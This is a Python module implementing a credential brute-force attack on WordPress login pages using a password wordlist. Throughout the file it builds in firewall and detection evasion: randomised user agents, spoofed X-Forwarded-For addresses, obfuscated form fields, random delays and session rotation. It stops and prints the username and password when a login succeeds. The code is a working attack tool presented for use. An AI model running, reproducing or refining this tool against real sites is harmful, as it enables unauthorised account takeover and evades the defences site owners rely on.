import requests
from bs4 import BeautifulSoup
from utils import generate_random_user_agent, random_delay, obfuscate_payload
import sys
import random

class WAFBruteforcer:
    def __init__(self, target_url, username, wordlist_path, delay_range=(1, 3), max_attempts=100):
        """
        Initialize the bruteforce tester
        
        Args:
            target_url (str): WordPress login URL
            username (str): Username to test
            wordlist_path (str): Path to password wordlist
            delay_range (tuple): Min/max delay between attempts (seconds)
            max_attempts (int): Reset session after X attempts
        """
        self.target_url = target_url
        self.username = username
        self.wordlist_path = wordlist_path
        self.delay_range = delay_range
        self.max_attempts = max_attempts
        self.session = requests.Session()
        self.attempt_count = 0
    
    def load_wordlist(self):
        """Safe wordlist loader with line limit"""
        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Failed to load wordlist: {str(e)}")
            sys.exit(1)
    
    def execute_attack(self):
        """Main attack controller"""
        passwords = self.load_wordlist()
        total = len(passwords)
        
        print(f"[*] Starting attack on {self.target_url}")
        print(f"[*] Loaded {total} passwords")
        print(f"[*] Configured delay: {self.delay_range[0]}-{self.delay_range[1]}s")
        print("[*] Press Ctrl+C to abort\n")
        
        for i, password in enumerate(passwords, 1):
            try:
                random_delay(*self.delay_range)
                self._make_attempt(password, i, total)
                
                # Session rotation logic
                self.attempt_count += 1
                if self.attempt_count >= self.max_attempts:
                    self._reset_session()
                    
            except KeyboardInterrupt:
                print("\n[!] Attack interrupted by user")
                sys.exit(0)
            except Exception as e:
                print(f"[!] Attempt {i} failed: {str(e)}")
                self._reset_session()
                continue
    
    def _make_attempt(self, password, attempt_num, total):
        """Single login attempt with WAF evasion"""
        # Prepare evasive headers
        headers = {
            'User-Agent': generate_random_user_agent(),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'es-ES,es;q=0.8'])
        }
        
        # Obfuscate payload
        data = {
            'log': obfuscate_payload(self.username),
            'pwd': obfuscate_payload(password),
            'wp-submit': random.choice(['Log+In', 'Submit'])
        }
        
        # Make the request
        try:
            response = self.session.post(
                self.target_url,
                data=data,
                headers=headers,
                allow_redirects=True,
                timeout=10
            )
            
            # Check for successful login
            if 'wp-admin' in response.url or 'dashboard' in response.url:
                print(f"\n[+] SUCCESS! Credentials found after {attempt_num}/{total} attempts")
                print(f"[+] Username: {self.username}")
                print(f"[+] Password: {password}")
                sys.exit(0)
                
            # Progress feedback
            if attempt_num % 10 == 0:
                pwd_sample = password[:15] + '...' if len(password) > 15 else password
                print(f"[*] Attempt {attempt_num}/{total} | Testing: '{pwd_sample}'")
                
        except requests.exceptions.RequestException as e:
            raise Exception(f"Request failed: {str(e)}")
    
    def _reset_session(self):
        """Reset session to avoid detection"""
        self.session = requests.Session()
        self.attempt_count = 0
        print("[*] Session rotated to avoid detection")

if __name__ == "__main__":
    print("This module should be used via cli.py or imported")
    sys.exit(1)
